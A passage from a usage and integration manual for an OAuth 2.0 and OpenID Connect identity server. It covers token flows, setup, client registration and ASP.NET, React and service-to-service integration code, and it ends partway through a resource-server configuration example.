# HCL.CS.SF Identity Platform
## Usage & Integration Manual

**Version:** 1.0  
**Last Updated:** February 2026  
**Target Audience:** Software Engineers, System Architects, Security Teams

---

## Table of Contents

1. [Introduction to HCL.CS.SF](#1-introduction-to-HCL.CS.SF)
2. [Core Features Overview](#2-core-features-overview)
3. [Architecture Overview](#3-architecture-overview)
4. [How to Setup HCL.CS.SF](#4-how-to-setup-HCL.CS.SF-step-by-step)
5. [How to Register a Client](#5-how-to-register-a-client)
6. [How to Integrate with Applications](#6-how-to-integrate-with-applications)
7. [Token Lifecycle Explained](#7-token-lifecycle-explained)
8. [Security Best Practices](#8-security-best-practices)
9. [Common Use Cases](#9-common-use-cases)
10. [Troubleshooting Guide](#10-troubleshooting-guide)
11. [FAQ](#11-faq)
12. [Deployment Checklist](#12-deployment-checklist)

---

## 1. Introduction to HCL.CS.SF

### 1.1 What is HCL.CS.SF?

HCL.CS.SF is an OAuth 2.0 and OpenID Connect (OIDC) authorization server. It authenticates users and issues security tokens that applications use to access protected resources.

Think of HCL.CS.SF as a security checkpoint:
- Users prove their identity to HCL.CS.SF
- HCL.CS.SF issues a token (like a temporary badge)
- Applications present this token to access APIs
- APIs validate the token with HCL.CS.SF before allowing access

### 1.2 What Problem Does HCL.CS.SF Solve?

**Without HCL.CS.SF (The Problem):**
```
┌─────────┐     ┌─────────┐     ┌─────────┐
│  App A  │     │  App B  │     │  App C  │
│  ─────  │     │  ─────  │     │  ─────  │
│  Own    │     │  Own    │     │  Own    │
│  Users  │     │  Users  │     │  Users  │
└────┬────┘     └────┬────┘     └────┬────┘
     │               │               │
     └───────────────┼───────────────┘
                     │
         Users have multiple accounts
         Passwords stored in multiple places
         No single source of truth
```

**With HCL.CS.SF (The Solution):**
```
┌─────────┐     ┌─────────┐     ┌─────────┐
│  App A  │     │  App B  │     │  App C  │
└────┬────┘     └────┬────┘     └────┬────┘
     │               │               │
     └───────────────┼───────────────┘
                     │
              ┌─────────────┐
              │   HCL.CS.SF    │
              │   ───────   │
              │  Central    │
              │  Identity   │
              └─────────────┘
                     │
         One login for all apps
         Central user management
         Consistent security policy
```

### 1.3 Where HCL.CS.SF Fits

```
┌─────────────────────────────────────────────────────────────────┐
│                         CLIENT LAYER                            │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐          │
│  │   Web App    │  │  Mobile App  │  │    SPA       │          │
│  │  (ASP.NET)   │  │  (iOS/Andr)  │  │  (React)     │          │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘          │
└─────────┼────────────────┼────────────────┼────────────────────┘
          │                │                │
          └────────────────┴────────────────┘
                           │
                    ┌──────┴──────┐
                    │   HCL.CS.SF    │  ← Identity Provider
                    │  ─────────  │    (OAuth 2.0 / OIDC)
                    │  Auth Server│
                    └──────┬──────┘
                           │
          ┌────────────────┼────────────────┐
          │                │                │
┌─────────┼────────────────┼────────────────┼────────────────────┐
│         │      API LAYER │                │                    │
│  ┌──────┴──────┐  ┌──────┴──────┐  ┌──────┴──────┐             │
│  │  API GW     │  │ Resource    │  │ Resource    │             │
│  │  (Kong/AWS) │  │ Server A    │  │ Server B    │             │
│  └─────────────┘  └─────────────┘  └─────────────┘             │
└─────────────────────────────────────────────────────────────────┘
```

### 1.4 Supported Protocols

| Protocol | Version | Use Case |
|----------|---------|----------|
| OAuth 2.0 | RFC 6749 | Authorization framework |
| OpenID Connect | 1.0 | Authentication layer |
| PKCE | RFC 7636 | Secure mobile/SPA apps |
| JWT | RFC 7519 | Token format |
| JWKS | RFC 7517 | Public key distribution |
| Token Revocation | RFC 7009 | Token invalidation |
| Token Introspection | RFC 7662 | Token validation |

### 1.5 Target Users

| User Type | How They Use HCL.CS.SF |
|-----------|---------------------|
| **Developers** | Integrate applications with OAuth/OIDC flows |
| **Enterprises** | Centralize employee authentication (SSO) |
| **SaaS Providers** | Offer secure authentication to customers |
| **Microservices Teams** | Secure service-to-service communication |

---

## 2. Core Features Overview

### 2.1 Authorization Code Flow (S256 Enforced)

**What it does:**
The most secure OAuth flow for web applications. User authenticates with HCL.CS.SF, HCL.CS.SF redirects back with a code, app exchanges code for tokens.

**Why S256 enforcement matters:**
- PKCE (Proof Key for Code Exchange) prevents authorization code interception
- S256 method uses SHA256 hashing—cryptographically secure
- Plain text method is rejected—prevents downgrade attacks

**Where it is used:**
- Web applications (ASP.NET, Node.js, PHP)
- Mobile applications (iOS, Android)
- Single Page Applications (React, Vue, Angular)

**Example:**
```
1. User clicks "Login" in web app
2. App redirects to HCL.CS.SF with PKCE parameters
3. User enters credentials on HCL.CS.SF
4. HCL.CS.SF redirects back with authorization code
5. App exchanges code for access token (with PKCE verifier)
6. App uses access token to call APIs
```

### 2.2 Client Credentials Flow

**What it does:**
Machine-to-machine authentication. No user involved—services authenticate directly.

**Why it matters:**
- Backend services need to talk to each other securely
- No browser or user interaction required
- Scoped access (not all-powerful)

**Where it is used:**
- Microservices calling each other
- Batch jobs accessing APIs
- Server-side integrations

**Example:**
```
1. Service A needs data from Service B
2. Service A authenticates with HCL.CS.SF using client ID + secret
3. HCL.CS.SF returns access token
4. Service A calls Service B API with token
5. Service B validates token and returns data
```

### 2.3 Refresh Token Rotation + Reuse Detection

**What it does:**
When you refresh an access token, you get a NEW refresh token. The old one is marked as used. If someone tries to use the old one, all tokens in that "family" are revoked.

**Why it matters:**
- Limits damage if refresh token is stolen
- Detects token theft (attacker uses stolen token, legitimate user gets new one, old one fails)
- Forces re-authentication when theft detected

**Where it is used:**
- Long-lived sessions (mobile apps, web apps)
- Remember-me functionality

**How it works:**
```
Initial Login:
  Access Token (15 min) + Refresh Token #1

After Refresh:
  Access Token (new, 15 min) + Refresh Token #2
  Refresh Token #1 → marked "consumed"

If Attacker Uses #1:
  Request rejected, Refresh Token #2 also revoked
  User forced to log in again
```

### 2.4 Token Revocation (RFC 7009)

**What it does:**
Immediately invalidate a token. Used when user logs out or token is compromised.

**Why it matters:**
- Users can log out from all devices
- Compromised tokens can be disabled
- Required for security compliance

**Where it is used:**
- Logout buttons
- Security incident response
- Admin panels (revoke user access)

**Example:**
```
POST /connect/revocation
Content-Type: application/x-www-form-urlencoded

token=abc123...
&token_type_hint=refresh_token

Response: 200 OK (token revoked)
```

### 2.5 Token Introspection (RFC 7662)

**What it does:**
Check if a token is valid and get information about it (user, scopes, expiration).

**Why it matters:**
- APIs need to validate tokens
- Get user details without parsing JWT
- Works with opaque tokens (not just JWT)

**Where it is used:**
- API Gateways validating tokens
- Resource servers checking permissions
- Audit and monitoring systems

**Example:**
```
POST /connect/introspect
Content-Type: application/x-www-form-urlencoded

token=eyJhbGciOiJSUzI1NiIsInR5cCI6ImF0K2p3dCJ9...

Response:
{
  "active": true,
  "client_id": "my-app",
  "username": "john.doe@example.com",
  "scope": "openid profile api.read",
  "exp": 1704067200
}
```

### 2.6 JWT + JWKS Support

**What JWT does:**
JSON Web Tokens contain claims (user info, permissions) signed by HCL.CS.SF. APIs can validate them without calling HCL.CS.SF.

**What JWKS does:**
JSON Web Key Set publishes the public keys needed to validate JWT signatures.

**Why it matters:**
- Stateless validation (no database lookup)
- Standard format across platforms
- Public keys can be rotated without breaking existing tokens

**Where it is used:**
- API validation
- Microservices security
- Third-party integrations

### 2.7 Asymmetric Signing (RS256/ES256)

**What it does:**
Uses public/private key pairs instead of shared secrets.
- RS256: RSA + SHA256
- ES256: ECDSA + SHA256 (faster, smaller signatures)

**Why it matters:**
- Private key stays on HCL.CS.SF server only
- Public key can be safely distributed
- Compromised client cannot forge tokens

**Where it is used:**
- All token signing in HCL.CS.SF
- JWT validation by resource servers

### 2.8 Strict Audience Validation

**What it does:**
Every token specifies who it is for (the "audience"). APIs reject tokens meant for other APIs.

**Why it matters:**
- Prevents token substitution attacks
- Token for "payment-api" won't work on "user-api"
- Limits blast radius if token leaks

**Where it is used:**
- Multi-API environments
- Microservices architectures
- Third-party API access

### 2.9 Rate Limiting

**What it does:**
Limits how many requests can be made to authentication endpoints.
- Critical endpoints (token, login): 20 requests per minute
- Default endpoints: 120 requests per minute

**Why it matters:**
- Prevents brute force attacks
- Protects against accidental DoS
- Ensures fair resource usage

**Where it is used:**
- All HCL.CS.SF endpoints
- Configured per IP address + client

### 2.10 Security Headers

**What they do:**
HTTP response headers that tell browsers how to handle content securely.

**Headers included:**
- `X-Frame-Options: DENY` — Prevents clickjacking
- `X-Content-Type-Options: nosniff` — Prevents MIME sniffing
- `Referrer-Policy: no-referrer` — Limits referrer leakage
- `Content-Security-Policy` — Restricts resource loading

**Why they matter:**
- Protects against common web attacks
- Required for security compliance
- Browser-enforced security

### 2.11 Secret Management via Environment Variables

**What it does:**
All secrets (database passwords, signing keys, API keys) are read from environment variables, never from configuration files.

**Why it matters:**
- Prevents secrets in source control
- Different values per environment (dev/staging/prod)
- Compatible with Kubernetes secrets, AWS Secrets Manager, Vault

**Where it is used:**
- Database connection strings
- Signing certificates
- SMTP credentials
- SMS gateway credentials

### 2.12 Clean Architecture Layering

**What it does:**
Code organized in layers with strict dependency rules:
- Domain Layer: Business rules, entities
- Application Layer: Use cases, services
- Infrastructure Layer: Database, external APIs
- Presentation Layer: HTTP endpoints

**Why it matters:**
- Easier to test (mock dependencies)
- Easier to maintain (changes isolated)
- Easier to understand (clear boundaries)

---

## 3. Architecture Overview

### 3.1 System Components

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              HCL.CS.SF SYSTEM                                  │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │                     AUTHORIZATION SERVER                             │   │
│  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐              │   │
│  │  │  Authorize   │  │    Token     │  │   Discovery  │              │   │
│  │  │  Endpoint    │  │   Endpoint   │  │   Endpoint   │              │   │
│  │  └──────────────┘  └──────────────┘  └──────────────┘              │   │
│  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐              │   │
│  │  │  Revocation  │  │ Introspection│  │    JWKS      │              │   │
│  │  │  Endpoint    │  │   Endpoint   │  │   Endpoint   │              │   │
│  │  └──────────────┘  └──────────────┘  └──────────────┘              │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                    │                                        │
│  ┌─────────────────────────────────┼───────────────────────────────────┐   │
│  │           TOKEN STORE           │                                   │   │
│  │  ┌─────────────────────────────────────────────────────────────┐   │   │
│  │  │  SecurityTokens Table                                       │   │   │
│  │  │  • Access tokens (JWT)                                      │   │   │
│  │  │  • Refresh tokens (SHA256 hashed)                           │   │   │
│  │  │  • Authorization codes (single-use)                         │   │   │
│  │  └─────────────────────────────────────────────────────────────┘   │   │
│  └───────────────────────────────────────────────────────────────────┘   │
│                                    │                                        │
│  ┌─────────────────────────────────┼───────────────────────────────────┐   │
│  │         USER DATABASE           │                                   │   │
│  │  ┌─────────────────────────────────────────────────────────────┐   │   │
│  │  │  Users, Roles, Clients, ApiResources, AuditTrail            │   │   │
│  │  └─────────────────────────────────────────────────────────────┘   │   │
│  └───────────────────────────────────────────────────────────────────┘   │
│                                    │                                        │
└────────────────────────────────────┼──────────────────────────────────────┘
                                     │
                    Token Validation │ Token Issuance
                     (JWKS, Introspect)│ (Authorize, Token)
                                     │
┌────────────────────────────────────┼──────────────────────────────────────┐
│                         EXTERNAL SYSTEMS                                  │
│                                                                             │
│  ┌──────────────┐              ┌──────────────┐              ┌──────────┐  │
│  │   Client     │              │   Resource   │              │   API    │  │
│  │ Application  │◄────────────►│   Server     │◄────────────►│ Gateway  │  │
│  │  (Web/SPA)   │   Login/     │   (Your API) │   Validate   │  (Kong/  │  │
│  └──────────────┘   Tokens     └──────────────┘   Tokens     │  nginx)  │  │
│                                                              └──────────┘  │
└────────────────────────────────────────────────────────────────────────────┘
```

### 3.2 Token Flow

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         TOKEN FLOW DIAGRAM                                  │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  STEP 1: AUTHENTICATION                                                     │
│  ─────────────────────                                                      │
│                                                                             │
│  User ──► Browser ──► /authorize ──► HCL.CS.SF ──► Login Page                 │
│                               (with PKCE)                                   │
│                                                                             │
│  User enters credentials                                                    │
│                                                                             │
│  HCL.CS.SF ──► Redirect ──► Browser ──► /callback ──► Client App              │
│                    (with authorization code)                                │
│                                                                             │
│  STEP 2: TOKEN EXCHANGE                                                     │
│  ──────────────────────                                                     │
│                                                                             │
│  Client App ──► POST /token ──► HCL.CS.SF                                     │
│              (code + code_verifier + client_secret)                         │
│                                                                             │
│  HCL.CS.SF ──► Response ──► Client App                                        │
│              {                                                              │
│                access_token: "eyJhbGciOiJSUzI1Ni...",                       │
│                refresh_token: "8xLOxBtZp8...",                              │
│                expires_in: 900                                              │
│              }                                                              │
│                                                                             │
│  STEP 3: API ACCESS                                                         │
│  ───────────────────                                                        │
│                                                                             │
│  Client App ──► GET /api/data                                              │
│              Header: Authorization: Bearer eyJhbGciOiJSUzI1Ni...            │
│                  ──► API Gateway                                           │
│                      ──► Validate JWT (signature, audience, expiry)        │
│                          ──► Resource Server                               │
│                              ──► Return Data                               │
│                                  ──► Client App                            │
│                                                                             │
│  STEP 4: TOKEN REFRESH (when access token expires)                         │
│  ──────────────────────────────────────────────────                         │
│                                                                             │
│  Client App ──► POST /token                                                │
│              grant_type=refresh_token                                       │
│              &refresh_token=8xLOxBtZp8...                                  │
│                  ──► HCL.CS.SF                                                │
│                      ──► Mark old token consumed                           │
│                          ──► Issue NEW access + refresh tokens             │
│                              ──► Client App                                │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 3.3 Validation Flow

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                      TOKEN VALIDATION FLOW                                  │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  API Receives Request with Bearer Token                                     │
│              │                                                              │
│              ▼                                                              │
│  ┌───────────────────────┐                                                  │
│  │ 1. Extract JWT from   │                                                  │
│  │    Authorization header│                                                 │
│  └───────────┬───────────┘                                                  │
│              │                                                              │
│              ▼                                                              │
│  ┌───────────────────────┐                                                  │
│  │ 2. Fetch JWKS from    │                                                  │
│  │    /.well-known/jwks  │                                                  │
│  └───────────┬───────────┘                                                  │
│              │                                                              │
│              ▼                                                              │
│  ┌───────────────────────┐                                                  │
│  │ 3. Find matching key  │                                                  │
│  │    by "kid" header    │                                                  │
│  └───────────┬───────────┘                                                  │
│              │                                                              │
│              ▼                                                              │
│  ┌───────────────────────┐     ┌───────────────────────┐                    │
│  │ 4. Verify signature   │────►│ Invalid? ──► 401      │                    │
│  │    using public key   │     └───────────────────────┘                    │
│  └───────────┬───────────┘                                                  │
│              │                                                              │
│              ▼                                                              │
│  ┌───────────────────────┐     ┌───────────────────────┐                    │
│  │ 5. Validate claims:   │────►│ Invalid? ──► 401      │                    │
│  │    • iss (issuer)     │     └───────────────────────┘                    │
│  │    • aud (audience)   │                                                  │
│  │    • exp (expiration) │                                                  │
│  └───────────┬───────────┘                                                  │
│              │                                                              │
│              ▼                                                              │
│  ┌───────────────────────┐                                                  │
│  │ 6. Extract user info  │                                                  │
│  │    • sub (user ID)    │                                                  │
│  │    • scope (permissions)│                                                │
│  │    • role             │                                                  │
│  └───────────┬───────────┘                                                  │
│              │                                                              │
│              ▼                                                              │
│         Request Authorized ──► Process API Call                             │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 4. How to Setup HCL.CS.SF (Step-by-Step)

### 4.1 Local Development Setup

#### Prerequisites

- .NET 8.0 SDK
- SQL Server / MySQL / PostgreSQL / SQLite (choose one)
- OpenSSL (for generating test certificates)

#### Step 1: Clone and Build

```bash
git clone <repository-url>
cd HCL.CS.SF
dotnet build HCL.CS.SF.sln
```

#### Step 2: Set Environment Variables

Create a `.env` file or export directly:

```bash
# Required
export HCL.CS.SF_DB_CONNECTION_STRING="Server=localhost;Database=HCL.CS.SFDev;User Id=sa;Password=YourPassword;"
export HCL.CS.SF_TOKEN_ISSUER_URI="https://localhost:5001"

# Optional (self-signed certs will be auto-generated if not provided)
export HCL.CS.SF_RSA_SIGNING_CERT_BASE64=""
export HCL.CS.SF_ECDSA_SIGNING_CERT_BASE64=""
export HCL.CS.SF_SIGNING_CERT_PASSWORD=""
```

#### Step 3: Database Setup

Run the installer project:

```bash
cd installer/HCL.CS.SF.Installer.Mvc
dotnet run
# Follow web setup wizard
```

Or manually run migrations:

```bash
# For SQL Server
dotnet ef database update --project src/Identity/HCL.CS.SF.Identity.Persistence

# Or use provided SQL scripts
cd scripts/seed/Sql
sqlcmd -S localhost -d HCL.CS.SFDev -i HCL.CS.SFSqlV1.sql
```

#### Step 4: Run the Server

```bash
cd demos/HCL.CS.SF.Demo.Server
dotnet run --urls "https://localhost:5001"
```

#### Step 5: Verify Discovery Endpoint

```bash
curl https://localhost:5001/.well-known/openid-configuration
```

Expected response:
```json
{
  "issuer": "https://localhost:5001",
  "authorization_endpoint": "https://localhost:5001/connect/authorize",
  "token_endpoint": "https://localhost:5001/connect/token",
  "introspection_endpoint": "https://localhost:5001/connect/introspect",
  "revocation_endpoint": "https://localhost:5001/connect/revocation",
  "jwks_uri": "https://localhost:5001/.well-known/openid-configuration/jwks"
}
```

### 4.2 Production Setup

#### Required Environment Variables

| Variable | Description | Example |
|----------|-------------|---------|
| `HCL.CS.SF_DB_CONNECTION_STRING` | Database connection | `Server=prod-db;Database=HCL.CS.SF;...` |
| `HCL.CS.SF_TOKEN_ISSUER_URI` | Public URL of HCL.CS.SF | `https://auth.yourcompany.com` |
| `HCL.CS.SF_RSA_SIGNING_CERT_BASE64` | RSA certificate (Base64) | `MIIFXTCCA0WgAwIBAgIQC...` |
| `HCL.CS.SF_ECDSA_SIGNING_CERT_BASE64` | ECDSA certificate (Base64) | `MIIBkTCB+wIJAKHBfpE...` |
| `HCL.CS.SF_SIGNING_CERT_PASSWORD` | Certificate password | `SecurePassword123!` |
| `HCL.CS.SF_RSA_SIGNING_KID` | RSA key identifier | `HCL.CS.SF-rsa-2026-q1` |
| `HCL.CS.SF_ECDSA_SIGNING_KID` | ECDSA key identifier | `HCL.CS.SF-ecdsa-2026-q1` |

#### TLS Requirements

- TLS 1.2 minimum
- Valid certificate from trusted CA
- HSTS enabled
- Certificate includes both RSA and ECDSA keys (for algorithm agility)

#### Reverse Proxy Configuration (Nginx Example)

```nginx
server {
    listen 443 ssl http2;
    server_name auth.yourcompany.com;

    ssl_certificate /etc/ssl/certs/yourcompany.com.crt;
    ssl_certificate_key /etc/ssl/private/yourcompany.com.key;
    ssl_protocols TLSv1.2 TLSv1.3;

    location / {
        proxy_pass https://localhost:5001;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

#### Key Rotation Strategy

1. Generate new certificates 30 days before expiry
2. Deploy new certificates alongside old ones
3. Update `HCL.CS.SF_*_SIGNING_KID` to new key
4. Wait 24 hours (for JWKS caching)
5. Remove old certificates from environment

#### Health Check Endpoints

```bash
# Liveness probe
GET /health/live

# Expected response:
HTTP 200 OK
Healthy
```

#### Rate Limiting Configuration

Edit `demos/HCL.CS.SF.Demo.Server/Program.cs`:

```csharp
builder.Services.AddRateLimiter(options =>
{
    options.GlobalLimiter = PartitionedRateLimiter.Create<HttpContext, string>(
        httpContext =>
    {
        var isCritical = path.StartsWith("/connect/token");
        
        return isCritical
            ? RateLimitPartition.GetFixedWindowLimiter(
                partitionKey,
                _ => new FixedWindowRateLimiterOptions
                {
                    PermitLimit = 20,        // Adjust per your needs
                    Window = TimeSpan.FromMinutes(1)
                })
            : RateLimitPartition.GetFixedWindowLimiter(
                partitionKey,
                _ => new FixedWindowRateLimiterOptions
                {
                    PermitLimit = 120,
                    Window = TimeSpan.FromMinutes(1)
                });
    });
});
```

#### CORS Configuration

```csharp
builder.Services.AddCors(options =>
{
    options.AddPolicy("ProductionCors", policy =>
    {
        policy.WithOrigins(
                "https://app.yourcompany.com",
                "https://admin.yourcompany.com")
            .WithMethods("GET", "POST")
            .WithHeaders("Authorization", "Content-Type", "X-Correlation-ID");
    });
});
```

---

## 5. How to Register a Client

### 5.1 Public Client (SPA, Mobile)

Use for: Single Page Applications, mobile apps (cannot keep secrets secure)

```json
{
  "ClientId": "my-spa-app",
  "ClientName": "My SPA Application",
  "ClientType": "Public",
  "AllowedGrantTypes": ["authorization_code"],
  "RequirePkce": true,
  "AllowedScopes": ["openid", "profile", "email", "api.read"],
  "RedirectUris": [
    "https://app.yourcompany.com/callback",
    "https://app.yourcompany.com/silent-renew"
  ],
  "PostLogoutRedirectUris": [
    "https://app.yourcompany.com/logout-callback"
  ],
  "AllowedCorsOrigins": [
    "https://app.yourcompany.com"
  ],
  "AccessTokenLifetime": 900,
  "RefreshTokenLifetime": 86400
}
```

**Key points:**
- `ClientType: Public` — No client secret
- `RequirePkce: true` — Mandatory PKCE
- Redirect URIs must be exact matches

### 5.2 Confidential Client (Web App, Backend)

Use for: Server-side web applications, backend services

```json
{
  "ClientId": "my-web-app",
  "ClientName": "My Web Application",
  "ClientType": "Confidential",
  "ClientSecret": "AutoGenerateSecureSecret",  // Will be hashed
  "AllowedGrantTypes": ["authorization_code", "client_credentials"],
  "RequirePkce": true,
  "AllowedScopes": ["openid", "profile", "email", "api.read", "api.write"],
  "RedirectUris": [
    "https://web.yourcompany.com/signin-oidc"
  ],
  "PostLogoutRedirectUris": [
    "https://web.yourcompany.com/signout-callback-oidc"
  ],
  "AllowedSigningAlgorithms": ["RS256", "ES256"],
  "AccessTokenLifetime": 900,
  "RefreshTokenLifetime": 86400
}
```

**Key points:**
- `ClientType: Confidential` — Has client secret
- `AllowedGrantTypes` — Can use both user and machine flows
- Secret is stored as hash (Argon2)

### 5.3 Required Redirect URIs

| URI Type | Purpose | Example |
|----------|---------|---------|
| Redirect URI | Where to send authorization code | `https://app.com/callback` |
| Post-Logout Redirect | Where to send after logout | `https://app.com/logout-done` |

**Rules:**
- Must be HTTPS in production
- Must match exactly (including trailing slashes)
- Wildcards NOT allowed (security requirement)

### 5.4 PKCE Requirements

All public clients MUST use PKCE:
- `code_challenge_method`: Must be `S256`
- `code_challenge`: BASE64URL(SHA256(code_verifier))
- `code_verifier`: 43-128 character random string

### 5.5 Client Secret Rules

For confidential clients:
- Minimum 32 characters
- Generated using cryptographically secure RNG
- Stored as Argon2 hash (not reversible)
- Must be rotated every 60 days (recommended)

### 5.6 Allowed Scopes

Available scopes:

| Scope | Purpose |
|-------|---------|
| `openid` | Required for OIDC (returns ID token) |
| `profile` | Access to name, family_name, given_name |
| `email` | Access to email, email_verified |
| `offline_access` | Request refresh token |
| `api.read` | Read access to your API |
| `api.write` | Write access to your API |

---

## 6. How to Integrate with Applications

### 6.1 ASP.NET Core Web App (Server-Side)

**NuGet Packages:**
```bash
dotnet add package Microsoft.AspNetCore.Authentication.OpenIdConnect
```

**Program.cs:**
```csharp
builder.Services.AddAuthentication(options =>
{
    options.DefaultScheme = "Cookies";
    options.DefaultChallengeScheme = "OpenIdConnect";
})
.AddCookie("Cookies", options =>
{
    options.Cookie.Name = "MyApp.Auth";
    options.Cookie.HttpOnly = true;
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
    options.Cookie.SameSite = SameSiteMode.Lax;
})
.AddOpenIdConnect("OpenIdConnect", options =>
{
    options.Authority = "https://auth.yourcompany.com";
    options.ClientId = "my-web-app";
    options.ClientSecret = "your-client-secret";
    
    options.ResponseType = "code";
    options.ResponseMode = "query";
    
    options.Scope.Clear();
    options.Scope.Add("openid");
    options.Scope.Add("profile");
    options.Scope.Add("email");
    options.Scope.Add("offline_access");
    
    options.CallbackPath = "/signin-oidc";
    options.SignedOutCallbackPath = "/signout-callback-oidc";
    
    options.SaveTokens = true;
    options.GetClaimsFromUserInfoEndpoint = true;
    
    // PKCE (enabled by default, but explicit here)
    options.UsePkce = true;
});

builder.Services.AddAuthorization();

var app = builder.Build();

app.UseAuthentication();
app.UseAuthorization();

app.MapControllers();
app.Run();
```

**Protecting a Controller:**
```csharp
[Authorize]
public class DashboardController : Controller
{
    public IActionResult Index()
    {
        // User is authenticated
        var userId = User.FindFirst("sub")?.Value;
        var email = User.FindFirst("email")?.Value;
        
        return View();
    }
    
    [Authorize(Roles = "Admin")]
    public IActionResult AdminOnly()
    {
        // Only users with Admin role
        return View();
    }
}
```

### 6.2 SPA (React / Next.js)

**Using oidc-client-ts:**

```bash
npm install oidc-client-ts
```

**auth-config.js:**
```javascript
export const oidcConfig = {
  authority: "https://auth.yourcompany.com",
  client_id: "my-spa-app",
  redirect_uri: "https://app.yourcompany.com/callback",
  response_type: "code",
  scope: "openid profile email api.read offline_access",
  post_logout_redirect_uri: "https://app.yourcompany.com/logout",
  
  // PKCE is handled automatically by the library
  // No client_secret for public clients
  
  automaticSilentRenew: true,
  silent_redirect_uri: "https://app.yourcompany.com/silent-renew",
  
  // Token refresh before expiry
  accessTokenExpiringNotificationTimeInSeconds: 60,
};
```

**AuthProvider.jsx:**
```jsx
import { UserManager } from 'oidc-client-ts';
import { createContext, useContext, useEffect, useState } from 'react';
import { oidcConfig } from './auth-config';

const userManager = new UserManager(oidcConfig);
const AuthContext = createContext(null);

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    userManager.getUser().then((user) => {
      setUser(user);
      setIsLoading(false);
    });

    // Handle token expiration
    userManager.events.addAccessTokenExpiring(() => {
      userManager.signinSilent();
    });

    return () => {
      userManager.events.removeAccessTokenExpiring();
    };
  }, []);

  const login = () => userManager.signinRedirect();
  const logout = () => userManager.signoutRedirect();

  return (
    <AuthContext.Provider value={{ user, login, logout, isLoading }}>
      {children}
    </AuthContext.Provider>
  );
}

export const useAuth = () => useContext(AuthContext);
```

**API Call with Token:**
```jsx
import { useAuth } from './AuthProvider';

function UserProfile() {
  const { user } = useAuth();
  const [data, setData] = useState(null);

  useEffect(() => {
    if (user) {
      fetch('https://api.yourcompany.com/profile', {
        headers: {
          'Authorization': `Bearer ${user.access_token}`
        }
      })
      .then(res => res.json())
      .then(setData);
    }
  }, [user]);

  return <div>{data?.name}</div>;
}
```

**Token Storage Best Practices:**
- NEVER store tokens in localStorage (XSS vulnerable)
- Use in-memory storage (lost on page refresh, use refresh token)
- oidc-client-ts handles tokens securely in memory
- Refresh tokens are stored securely by the library

### 6.3 Backend Service (Machine-to-Machine)

**Acquiring Token:**
```csharp
using System.Net.Http.Headers;
using System.Text;
using System.Text.Json;

public class TokenService
{
    private readonly HttpClient _httpClient;
    private readonly string _authority;
    private readonly string _clientId;
    private readonly string _clientSecret;

    public async Task<string> GetAccessTokenAsync()
    {
        var request = new HttpRequestMessage(
            HttpMethod.Post, 
            $"{_authority}/connect/token");

        var credentials = Convert.ToBase64String(
            Encoding.UTF8.GetBytes($"{_clientId}:{_clientSecret}"));
        
        request.Headers.Authorization = 
            new AuthenticationHeaderValue("Basic", credentials);

        request.Content = new FormUrlEncodedContent(
            new Dictionary<string, string>
            {
                ["grant_type"] = "client_credentials",
                ["scope"] = "api.read api.write"
            });

        var response = await _httpClient.SendAsync(request);
        response.EnsureSuccessStatusCode();

        var content = await response.Content.ReadAsStringAsync();
        var tokenResponse = JsonSerializer.Deserialize<TokenResponse>(content);
        
        return tokenResponse.AccessToken;
    }
}

public class TokenResponse
{
    [JsonPropertyName("access_token")]
    public string AccessToken { get; set; }
    
    [JsonPropertyName("expires_in")]
    public int ExpiresIn { get; set; }
}
```

**Using Token:**
```csharp
public class MyApiClient
{
    private readonly HttpClient _httpClient;
    private readonly TokenService _tokenService;

    public async Task<Data> GetDataAsync()
    {
        var token = await _tokenService.GetAccessTokenAsync();
        
        _httpClient.DefaultRequestHeaders.Authorization =
            new AuthenticationHeaderValue("Bearer", token);

        var response = await _httpClient.GetAsync(
            "https://api.yourcompany.com/data");
        
        response.EnsureSuccessStatusCode();
        return await response.Content.ReadFromJsonAsync<Data>();
    }
}
```

**Token Caching (Recommended):**
```csharp
public class CachedTokenService
{
    private string _cachedToken;
    private DateTime _expiry;
    private readonly SemaphoreSlim _lock = new(1, 1);

    public async Task<string> GetAccessTokenAsync()
    {
        await _lock.WaitAsync();
        try
        {
            if (_cachedToken != null && DateTime.UtcNow < _expiry)
            {
                return _cachedToken;
            }

            var token = await FetchNewTokenAsync();
            _cachedToken = token.AccessToken;
            _expiry = DateTime.UtcNow.AddSeconds(token.ExpiresIn - 60);
            return _cachedToken;
        }
        finally
        {
            _lock.Release();
        }
    }
}
```

### 6.4 Resource Server API

**NuGet Packages:**
```bash
dotnet add package Microsoft.AspNetCore.Authentication.JwtBearer
```

**Program.cs:**
```csharp
builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        options.Authority = "https://auth.yourcompany.com";
        options.Audience = "yourcompany.api";
        
        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidateIssuer = true,
            ValidateAudience = true,
            ValidateLifetime = true,
            ValidateIssuerSigningKey = true,
            ValidIssuer = "https://auth.yourcompany.com",
            ValidAudience = "yourcompany.api",
            ClockSkew = TimeSpan.FromMinutes(5)
        };
        
        // For debugging (disable in production)
        options.Events = new JwtBearerEvents
        {
            OnAuthenticationFailed = context =>
            {
                Console.WriteLine($"Auth failed: {context.Exception.Message}");
                return Task.CompletedTask;
            }
        };
    });

builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("ReadAccess", policy =>
        policy.RequireClaim("scope", "api.read"));
    
    options.AddPolicy("WriteAccess", policy =>
        policy.RequireClaim("scope", "api.write"));
    
